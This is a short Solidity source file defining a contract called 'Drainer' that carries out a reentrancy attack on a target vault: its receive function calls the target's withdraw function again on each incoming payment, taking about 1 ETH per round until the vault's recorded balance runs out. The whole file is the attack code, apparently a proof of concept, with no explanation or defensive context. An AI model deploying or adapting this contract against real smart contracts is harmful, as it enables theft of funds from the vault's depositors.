// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

contract Drainer {
    address target;
    uint256 ethInVault;

    constructor(address _target) {
        target = _target;
        ethInVault = address(target).balance;
    }

    function callWithdraw() public {
        (bool res,) = target.call(abi.encodeWithSignature("withdraw(uint256,address,address)", 0, address(this), address(this)));
        require(res == true, "withdraw call failed");
    }

    receive() payable external {
        if (ethInVault > 0) {
            ethInVault -= 1 ether; //The re-entracy always takes away 1 ETH from the vault
            callWithdraw();
        }
    }
}
